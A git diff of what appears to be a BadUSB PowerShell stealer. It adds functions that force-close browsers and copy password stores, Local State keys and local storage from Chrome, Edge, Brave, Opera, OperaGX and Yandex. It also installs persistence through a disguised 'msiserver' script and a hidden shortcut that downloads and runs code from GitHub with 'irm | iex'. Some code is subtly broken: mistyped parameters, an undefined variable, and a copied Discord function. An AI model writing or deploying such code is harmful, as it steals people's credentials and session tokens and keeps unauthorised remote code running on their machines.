@@ -572,6 +572,26 @@ Get-BrowserData -Browser "chrome" -DataType "bookmarks" >> $env:TMP\$FolderName\
 
 Get-BrowserData -Browser "firefox" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
 
+function chromiumBrowser {
+	[CmdletBinding()]
+	param (
+	[Parameter (Position=1,Mandatory = $True)]
+	[String]$Path,
+	(Parameter (Position=1,Mandatory = $True)]
+	[String]$Browser
+	)
+
+New-Item -Path $env:tmp/$FolderName/$Browser -ItemType Directory
+$localstate = "$path\User Data\Local State"
+$logindata = "$path\User Data\default\Login Data"
+$preferences = "$path\User Data\default\Preferences"
+$localstorage = "$path\User Data\default\Local Storage\leveldb\"
+Copy-Item $localstate "$env:TMP\$FolderName\$Browser\Local State"
+Copy-Item $localdata "$env:TMP\$FolderName\$Browser\Local Data"
+Copy-Item $preferences "$env:TMP\$FolderName\$Browser\Preferences"
+Copy-Item $localstorage "$env:TMP\$FolderName\$Browser\Local Storage\leveldb\"
+
+}
 
 # Get FireFox Passwords
 taskkill /IM firefox.exe /F
@@ -585,25 +605,77 @@ echo $key4 > $env:TMP\$FolderName\Firefox\logins.json
 # Get Chrome Passwords
 taskkill /IM chrome.exe /F
 sleep 1
-New-Item -Path $env:tmp/$FolderName/Chrome -ItemType Directory
-$localstate = "$env:appdata\..\local\Google\Chrome\User Data\Local State"
-$logindata = "$env:appdata\..\local\Google\Chrome\User Data\default\Login Data"
-$preferences = "$env:appdata\..\local\Google\Chrome\User Data\default\Preferences"
-Copy-Item $localstate "$env:TMP\$FolderName\Chrome\Local State"
-Copy-Item $localdata "$env:TMP\$FolderName\Chrome\Local Data"
-Copy-Item $preferences "$env:TMP\$FolderName\Chrome\Preferences"
-
+chromiumBrowser -Path "$env:appdata\..\local\Google\Chrome" -Browser "Chrome"
 
 # Get Edge Passwords
 taskkill /IM msedge.exe /F
 sleep 1
-New-Item -Path $env:tmp/$FolderName/Edge -ItemType Directory
-$localstate = "$env:appdata\..\Local\Microsoft\Edge\User Data\Local State"
-$logindata = "$env:appdata\..\Local\Microsoft\Edge\User Data\default\Login Data"
-$preferences = "$env:appdata\..\Local\Microsoft\Edge\User Data\default\Preferences"
-Copy-Item $localstate "$env:TMP\$FolderName\Edge\Local State"
-Copy-Item $localdata "$env:TMP\$FolderName\Edge\Local Data"
-Copy-Item $preferences "$env:TMP\$FolderName\Edge\Preferences"
+chromiumBrowser -Path "$env:appdata\..\Local\Microsoft\Edge" -Browser "Edge"
+
+# Get Brave Passwords
+taskkill /IM brave.exe /F
+sleep 1
+chromiumBrowser -Path "$env:appdata\..\Local\BraveSoftware\Brave-Browser" -Browser "Brave"
+
+# Get Opera Passwords
+taskkill /IM opera.exe /F
+taskkill /IM launcher.exe /F
+sleep 1
+$path="$env:appdata\Opera Software\Opera Stable"
+$Browser="Opera"
+New-Item -Path $env:tmp/$FolderName/$Browser -ItemType Directory
+$localstate = "$path\Local State"
+$logindata = "$path\Login Data"
+$preferences = "$path\Preferences"
+$leveldb = "$path\Local Storage\leveldb\"
+Copy-Item $localstate "$env:TMP\$FolderName\$Browser\Local State"
+Copy-Item $localdata "$env:TMP\$FolderName\$Browser\Local Data"
+Copy-Item $preferences "$env:TMP\$FolderName\$Browser\Preferences"
+Copy-Item $leveldb "$env:TMP\$FolderName\$Browser\Local Storage\leveldb"
+
+# Get OperaGX Passwords
+taskkill /IM opera.exe /F
+taskkill /IM launcher.exe /F
+sleep 1
+$path="$env:appdata\Opera Software\Opera GX Stable"
+$Browser="OperaGX"
+New-Item -Path $env:tmp/$FolderName/$Browser -ItemType Directory
+$localstate = "$path\Local State"
+$logindata = "$path\Login Data"
+$preferences = "$path\Preferences"
+$leveldb = "$path\Local Storage\leveldb\"
+Copy-Item $localstate "$env:TMP\$FolderName\$Browser\Local State"
+Copy-Item $localdata "$env:TMP\$FolderName\$Browser\Local Data"
+Copy-Item $preferences "$env:TMP\$FolderName\$Browser\Preferences"
+Copy-Item $leveldb "$env:TMP\$FolderName\$Browser\Local Storage\leveldb"
+
+# Get Yandex Passwords
+taskkill /IM browser.exe /F
+sleep 1
+chromiumBrowser -Path "$env:appdata\..\Local\Yandex\YandexBrowser" -Browser "Yandex"
+
+############################################################################################################################################################
+
+function discordStorage {
+	[CmdletBinding()]
+	param (
+	[Parameter (Position=1,Mandatory = $True)]
+	[String]$Path,
+	(Parameter (Position=1,Mandatory = $True)]
+	[String]$Browser
+	)
+
+New-Item -Path $env:tmp/$FolderName/$Browser -ItemType Directory
+$localstate = "$path\User Data\Local State"
+$logindata = "$path\User Data\default\Login Data"
+$preferences = "$path\User Data\default\Preferences"
+$localstorage = "$path\User Data\default\Local Storage\leveldb\"
+Copy-Item $localstate "$env:TMP\$FolderName\$Browser\Local State"
+Copy-Item $localdata "$env:TMP\$FolderName\$Browser\Local Data"
+Copy-Item $preferences "$env:TMP\$FolderName\$Browser\Preferences"
+Copy-Item $localstorage "$env:TMP\$FolderName\$Browser\Local Storage\leveldb\"
+
+}
 
 ############################################################################################################################################################
 
@@ -704,11 +776,15 @@ if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -text $text}
 ############################################################################################################################################################
  
 # Setup Persistence if possible
+if(![System.IO.File]::Exists($env:appdata+"\..\Local\msiserver.ps1")){
+	$data = "`$dc='$dc';irm https://raw.githubusercontent.com/sealldeveloper/files.seall.dev/main/badusb/SeallDEV%2Bjakoby-RECON.ps1 | iex"
+	$data | Out-File $env:appdata+"\..\Local\msiserver.ps1"
+}
 if(![System.IO.File]::Exists($env:appdata+"\..\Local\msiserver.lnk")){
     $objShell = New-Object -COM WScript.Shell
 	$objShortCut = $objShell.CreateShortcut($env:appdata+"\..\Local\msiserver.lnk")
 	$target = "powershell"
-	$args = "-Nop -Noni -w h -ep bypass -command `"`$dc='"+$dc+"';irm https://raw.githubusercontent.com/sealldeveloper/files.seall.dev/main/badusb/SeallDEV%2Bjakoby-RECON.ps1 | iex`""
+	$args = "-Nop -Noni -w h -ep bypass -command `".\msiserver.ps1`""
 	$objShortCut.TargetPath = $target
 	$objShortcut.Arguments = $args
 	$objShortCut.Save()
